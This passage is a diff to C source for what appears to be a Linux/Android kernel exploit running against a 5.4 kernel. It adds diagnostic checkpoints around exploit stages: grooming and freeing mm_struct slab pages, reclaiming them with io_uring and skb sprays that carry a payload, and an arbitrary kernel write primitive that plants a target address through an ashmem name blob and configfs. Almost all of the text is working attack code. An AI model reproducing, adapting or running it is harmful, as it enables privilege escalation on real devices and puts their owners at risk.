+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-cache-before", slab_before.active_objs,
+                      slab_before.num_objs);
+#endif
+  for (size_t i = 0; i < batch; i++)
+    target_fds[i] = -1;
+  int collected = collect_controlled_mm_slab_page(
+      &base, target_fds, &buddy_guard_fd, &buddy_base);
+
+  size_t retained = 0;
+  for (size_t i = 0; i < batch; i++) {
+    if (target_fds[i] >= 0) {
+      retained++;
+      close(target_fds[i]);
+    }
+  }
+  if (buddy_guard_fd >= 0)
+    close(buddy_guard_fd);
+  struct mm_slabinfo slab_after = {0};
+  int slab_after_ok = read_mm_slabinfo(&slab_after);
+  pr_info("mmcollect cache stage=after-close ok=%d active=%lu objects=%lu object_size=%lu objs_per_slab=%lu pages_per_slab=%lu active_slabs=%lu slabs=%lu\n",
+          slab_after_ok, slab_after.active_objs, slab_after.num_objs,
+          slab_after.object_size, slab_after.objects_per_slab,
+          slab_after.pages_per_slab, slab_after.active_slabs,
+          slab_after.num_slabs);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-cache-after", slab_after.active_objs,
+                      slab_after.num_objs);
+#endif
+  pr_info("mmcollect-only result=%d base=%016zx buddy=%016zx retained=%zu/%zu guard=%d elapsed_ms=%llu\n",
+          collected, base, buddy_base, retained, batch,
+          buddy_guard_fd >= 0,
+          (unsigned long long)(mm_diag_now_ms() - started));
+  return collected;
+}
+#endif
+
 int release_controlled_mm_slab_page(
     int target_fds[], int *anchor_fd_out, unsigned long *slabs_before_out) {
   const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
   size_t trigger_count = CONTROLLED_RECLAIM_TRIGGER_SLABS * batch;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-trigger-create-start", trigger_count, batch);
+#endif
   int *triggers = malloc(trigger_count * sizeof(*triggers));
   if (!triggers)
     return 0;
 
   pin_to_core(0);
-  for (size_t i = 0; i < trigger_count; i++)
+  for (size_t i = 0; i < trigger_count; i++) {
     triggers[i] = clone_memfd();
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if ((i + 1) % 64 == 0 || i + 1 == trigger_count)
+      rmg_diag_checkpoint("reclaim-trigger-create", i + 1,
+                          trigger_count);
+#endif
+  }
   int anchor_fd = clone_memfd();
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-anchor-created", anchor_fd, 0);
+#endif
 
   if (slabs_before_out) {
     struct mm_slabinfo info = {0};
@@ -1198,11 +1765,22 @@ int release_controlled_mm_slab_page(
     SYSCHK(close(target_fds[i]));
     target_fds[i] = -1;
   }
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-target-fds-closed", batch - 1, 0);
+#endif
   usleep(1000000);
   for (size_t slab = 0; slab < CONTROLLED_RECLAIM_TRIGGER_SLABS; slab++) {
     size_t index = slab * batch;
     SYSCHK(close(triggers[index]));
     triggers[index] = -1;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("reclaim-trigger-slab-closed", slab + 1,
+                        CONTROLLED_RECLAIM_TRIGGER_SLABS);
+#endif
   }
   SYSCHK(close(target_fds[batch - 1]));
   target_fds[batch - 1] = -1;
@@ -1210,6 +1788,12 @@ int release_controlled_mm_slab_page(
   free(triggers); /* remaining fds intentionally stay open for this attempt */
   if (anchor_fd_out)
     *anchor_fd_out = anchor_fd;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-release-complete", anchor_fd,
+                      slabs_before_out ? *slabs_before_out : 0);
+#endif
   return 1;
 }
 
@@ -1230,6 +1814,11 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
     pr_warning("controlled mm group collection failed\n");
     return 0;
   }
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-mm-page-collected", base, buddy_base);
+#endif
   pr_info("controlled reclaim optional guard fd=%d buddy=%016zx\n",
           buddy_guard_fd, buddy_base);
 
@@ -1239,13 +1828,43 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
   if (!prepare_skb_payload(base, payload_mode))
     return 0;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-skb-payload-ready", base, payload_mode);
+#endif
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+  int sndbuf = 16 << 20;
+  errno = 0;
+  int sndbuf_set_ret = setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
+                                  &sndbuf, sizeof(sndbuf));
+  int sndbuf_set_errno = sndbuf_set_ret == 0 ? 0 : errno;
+  int sndbuf_actual = 0;
+  socklen_t sndbuf_actual_len = sizeof(sndbuf_actual);
+  errno = 0;
+  int sndbuf_get_ret = getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
+                                  &sndbuf_actual, &sndbuf_actual_len);
+  int sndbuf_get_errno = sndbuf_get_ret == 0 ? 0 : errno;
+  pr_info("controlled reclaim send buffer requested=%d set=%d/%d "
+          "actual=%d get=%d/%d\n", sndbuf, sndbuf_set_ret,
+          sndbuf_set_errno, sndbuf_actual, sndbuf_get_ret,
+          sndbuf_get_errno);
+#else
   int sndbuf = 8 << 20;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+#endif
   int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (flags >= 0)
     fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK);
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-socketpair-ready", reclaim_sv[0],
+                      reclaim_sv[1]);
+  rmg_diag_checkpoint("reclaim-uring-prewarm-start", 0, 0);
+#endif
 
   struct iovec iov = {
     .iov_base = skb_buf,
@@ -1258,25 +1877,78 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
 
   int uring_prewarm = controlled_uring_prewarm();
   pr_info("controlled io_uring prewarm=%d\n", uring_prewarm);
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-uring-prewarm-done", uring_prewarm, 0);
+#endif
   controlled_uring_finish_prewarm();
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-uring-prewarm-finished", 0, 0);
+  rmg_diag_checkpoint("reclaim-release-start", 0, 0);
+#endif
 
   unsigned long slab_before = 0;
   int anchor_fd = -1;
   if (!release_controlled_mm_slab_page(
           target_fds, &anchor_fd, &slab_before))
     return 0;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-release-done", anchor_fd, slab_before);
+  rmg_diag_checkpoint("reclaim-spectrum-start", 0, 0);
+#endif
 
   /* High-order pages bypass the order-0 PCP on this 5.4 kernel and merge
    * synchronously in the buddy allocator. Map payload-backed io_uring blocks
    * at orders 3..9 before the order-3 skb fallback so a merged target is
    * captured at whichever order stopped coalescing. */
   int spectrum = controlled_spectrum_reclaim();
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-spectrum-done", spectrum, 0);
+  rmg_diag_checkpoint("reclaim-sendmsg-start", SKB_RECLAIM_SENDS, 0);
+#endif
 
   int sent = 0;
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+  ssize_t send_results[SKB_RECLAIM_SENDS];
+  int send_errnos[SKB_RECLAIM_SENDS];
+  int send_attempts = 0;
+  int short_sends = 0;
+  unsigned long long sent_bytes = 0;
+#endif
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+    errno = 0;
+    ssize_t send_ret = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+    send_results[i] = send_ret;
+    send_errnos[i] = send_ret < 0 ? errno : 0;
+    send_attempts++;
+    if (send_ret < 0)
+      break;
+    if (send_ret == 0)
+      break;
+    sent_bytes += (unsigned long long)send_ret;
+    if (send_ret != (ssize_t)SKB_SEND_SIZE) {
+      short_sends++;
+      break;
+    }
+#else
     if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) <= 0)
       break;
+#endif
     sent++;
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("reclaim-sendmsg-progress", sent,
+                        SKB_RECLAIM_SENDS);
+#endif
   }
   struct mm_slabinfo slab_after = {0};
   int slab_after_ok = read_mm_slabinfo(&slab_after);
@@ -1284,6 +1956,28 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
           base, batch, CONTROLLED_RECLAIM_TRIGGER_SLABS, spectrum, sent,
           SKB_RECLAIM_SENDS, anchor_fd, slab_before,
           slab_after.num_slabs);
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+  int send_stream_complete = sent == SKB_RECLAIM_SENDS;
+  pr_info("controlled reclaim send summary attempts=%d full=%d short=%d "
+          "bytes=%llu requested=%llu complete=%d\n", send_attempts,
+          sent, short_sends, sent_bytes,
+          (unsigned long long)SKB_RECLAIM_SENDS * SKB_SEND_SIZE,
+          send_stream_complete);
+  for (int i = 0; i < send_attempts; i++) {
+    pr_info("controlled reclaim send[%d] ret=%zd errno=%d\n", i,
+            send_results[i], send_errnos[i]);
+  }
+  if (!send_stream_complete) {
+    pr_warning("controlled reclaim send stream incomplete; partial stream "
+               "is not accepted as complete\n");
+  }
+#endif
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-scan-result", slab_after_ok,
+                      slab_after.num_slabs);
+#endif
   if (!slab_after_ok || slab_after.num_slabs >= slab_before) {
     pr_warning("controlled reclaim rejected: target slab was not discarded\n");
     close_reclaim_sockets();
@@ -1294,7 +1988,14 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
     close_reclaim_sockets();
     return 0;
   }
+#if defined(RMG_DIAG_COW_SEND_TRACE) && RMG_DIAG_COW_SEND_TRACE
+  /* A short stream is not a valid skb spray. Continue only when the separate
+   * spectrum route independently captured the target page, so this build can
+   * still measure the COW timing path without trusting partial send data. */
+  return (spectrum > 0 || send_stream_complete) ? base : 0;
+#else
   return (spectrum || sent) ? base : 0;
+#endif
 }
 
 uintptr_t prepare_kernel_page(int payload_mode) {
@@ -1768,8 +2469,21 @@ static int controlled_spectrum_reclaim(void) {
     512, 1024, 2048, 4096, 8192, 16384, 32768,
   };
   int sprayed = 0;
-  for (size_t i = 0; i < sizeof(entries) / sizeof(entries[0]); i++)
+  for (size_t i = 0; i < sizeof(entries) / sizeof(entries[0]); i++) {
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("reclaim-spectrum-step-start", entries[i],
+                        sprayed);
+#endif
     sprayed += controlled_uring_spray_one(entries[i]);
+#if defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("reclaim-spectrum-step-done", entries[i],
+                        sprayed);
+#endif
+  }
   pr_info("controlled spectrum total=%d\n", sprayed);
   return sprayed;
 }
@@ -1870,16 +2584,44 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
   put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
   put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  int trace_cfi_write = target == binwrite_target &&
+      len == sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+  if (trace_cfi_write)
+    rmg_diag_checkpoint("cfi-configfs-write-start", target, len);
+#else
+  int trace_cfi_write = 0;
+#endif
   errno = 0;
-  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
+  int set_ret = try_set_ashmem_name_blob_internal(
+      fd, blob, sizeof(blob), trace_cfi_write);
   int set_errno = errno;
   if (set_ret != 0) {
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if (trace_cfi_write)
+      rmg_diag_checkpoint("cfi-configfs-name-fail", set_errno, 0);
+#endif
     errno = set_errno;
     return -1;
   }
 
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  if (trace_cfi_write)
+    rmg_diag_checkpoint("cfi-configfs-pwrite-enter", target, len);
+#endif
   errno = 0;
   ssize_t wr = pwrite(fd, data, len, 0);
+  int write_errno = errno;
+#if defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY && \
+    defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  if (trace_cfi_write)
+    rmg_diag_checkpoint("cfi-configfs-pwrite-return",
+                        (unsigned long long)(long long)wr, write_errno);
+#endif
+  errno = write_errno;
   return wr;
 }
 
